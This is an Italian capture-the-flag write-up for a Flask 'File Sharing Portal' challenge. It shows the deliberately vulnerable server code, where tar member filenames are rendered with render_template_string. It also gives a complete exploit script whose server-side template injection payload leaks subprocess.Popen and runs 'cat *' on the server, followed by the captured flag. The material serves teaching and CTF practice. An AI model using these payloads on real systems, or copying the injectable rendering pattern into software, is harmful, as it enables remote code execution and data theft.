+++
title = 'File Sharing Portal'
tags = [
  "Web",
  "Python",
  "Template Injection"
]
date = 2024-08-06T11:27:07+02:00
draft = true
+++

# File Sharing Portal

**Descrizione**: Benvenuti nel portale di condivisione dei file! Supportiamo solo file tar!

**Autori**: NoobMaster + NoobHacker

**Punti**: 478

**Soluzioni**: 119

## Introduction

Il ctf ha una struttura molto semplice: abbiamo un form in cui ci viene chiesto di inserire un file [tar](https://en.wikipedia.org/wiki/Tar_(computing)); una volta inserito il file tar, questo viene decompresso e ci viene mostrato il `nome` dei file che contiene; cliccando sui diversi file, possiamo leggerne il contenuto.

## Source

**Il sorgente ha commenti aggiunti in seguito per consentire una migliore comprensione del codice nei writeup**

```python
# filename: server.py

#!/usr/bin/env python3
from flask import Flask, request, redirect, render_template, render_template_string
import tarfile
from hashlib import sha256
import os
app = Flask(__name__)

@app.route('/',methods=['GET','POST'])
def main():
    # Questa funzione si occupa principalmente di caricare il file tar nel file system del server.
    global username
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        file = request.files['file']
        if file.filename[-4:] != '.tar': # Verificare che il file passato sia effettivamente un file tar
            return render_template_string("<p> We only support tar files as of right now!</p>") # Altrimenti, viene visualizzato un messaggio di errore
        name = sha256(os.urandom(16)).digest().hex() # Crea un nome casuale che verrà utilizzato per denominare il tar e la cartella nel file system del server.
        os.makedirs(f"./uploads/{name}", exist_ok=True) # Crea la directory
        file.save(f"./uploads/{name}/{name}.tar") # Salva il file tar
        try:
            # Estrae il file tar
            tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
            tar_file.extractall(path=f'./uploads/{name}/')
            return render_template_string(f"<p>Tar file extracted! View <a href='/view/{name}'>here</a>")
        except:
            return render_template_string("<p>Failed to extract file!</p>")

@app.route('/view/<name>')
def view(name):
    # Questa funzione visualizza i file contenuti nel file .tar
    if not all([i in "abcdef1234567890" for i in name]): # Controllare che il nome del file sia in esadecimale, per evitare qualsiasi tipo di input dannoso. 
        return render_template_string("<p>Error!</p>")
        #print(os.popen(f'ls ./uploads/{name}').read())
            #print(name)
    files = os.listdir(f"./uploads/{name}") # Elenca tutti i file presenti nella cartella precedentemente creata 
    out = '<h1>Files</h1><br>'
    files.remove(f'{name}.tar')  # Rimuove il file tar dall'elenco
    for i in files:
        out += f'<a href="/read/{name}/{i}">{i}</a>' # Mostra tramite modelli tutti i nomi dei file
       # except:
    return render_template_string(out) # Renderizzare il modello con la funzione render_template_string

@app.route('/read/<name>/<file>')
def read(name,file):
    # La funzione mostra il contenuto del singolo file
    if (not all([i in "abcdef1234567890" for i in name])): # Controllare che il nome del file sia in esadecimale, per evitare qualsiasi tipo di input dannoso. 
        return render_template_string("<p>Error!</p>")
    if ((".." in name) or (".." in file)) or (("/" in file) or "/" in name):  # Altri controlli per evitare l'errore di percorso
        return render_template_string("<p>Error!</p>")
    f = open(f'./uploads/{name}/{file}') # Apre il file
    data = f.read()
    f.close()
    return data # Ritorna il contenuto del file

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)


```

Si può quindi notare che ci sono diversi controlli sui parametri e, in un primo momento, si potrebbe pensare che il codice sia sicuro al 100%.

## Solution

La prima cosa che ci è venuta in mente è stata quella di creare un [link simbolico](https://www.futurelearn.com/info/courses/linux-for-bioinformatics/0/steps/201767) per accedere alla flag, e in effetti questo funziona (provate con server.py), il problema è che il nome del file della flag è sconosciuto e questo non ci permette di creare un link simbolico valido.

Una volta capito questo, abbiamo fatto un'analisi approfondita del codice e siamo giunti alla conclusione che l'unica cosa che non veniva controllata era il nome del file tar scompattato, consentendoci di inserire qualsiasi cosa. Combinando questo con la funzione `render_template_string` (una funzione vulnerabile di flask), è possibile eseguire una [template injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#what-is-ssti-server-side-template-injection).

```python
# filename: exploit.py

import requests
import os
import tarfile
from bs4 import BeautifulSoup

url = 'http://redacted.challs.n00bzunit3d.xyz:8080/'


def create_tar(tar_name, file):
    with tarfile.open(tar_name, 'w') as tar:
        tar.add(file, arcname=os.path.basename(file))
    print(f'Tar file created: {tar_name}')


def create_payload(payload):
    with open(payload, 'w') as f:
        f.write('Remember to byte the cookies')

    create_tar('exploit.tar', payload)
    print(f'Payload created: {payload}')


def get_url_view(text):
    soup = BeautifulSoup(text, 'html5lib')
    return [a['href'] for a in soup.find_all('a', href=True)][0]


def leak_subprocess_index():
    payload = "{{int.__class__.__base__.__subclasses__()}}"
    create_payload(payload)

    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})

    url_file = get_url_view(r.text)
    r = requests.get(url + url_file)
    text = r.text[r.text.index('[')+1:]

    list_classes = text.split(',')

    for i, c in enumerate(list_classes):
        if 'subprocess.Popen' in c:
            print(f'Index subprocess.Popen: {i}')
            return str(i)


def get_flag(index):
    payload = "{{int.__class__.__base__.__subclasses__()[" + \
        index + "]('cat *', shell=True, stdout=-1).communicate()}}"
    create_payload(payload)

    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})

    url_file = get_url_view(r.text)
    r = requests.get(url + url_file)

    flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1]
    print(f'Flag: {flag}')


def main():
    subprocess_index = leak_subprocess_index()
    get_flag(subprocess_index)


if __name__ == '__main__':
    main()


```

```stdout
flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e}
```

<p align='right'>Author: akiidjk </p>
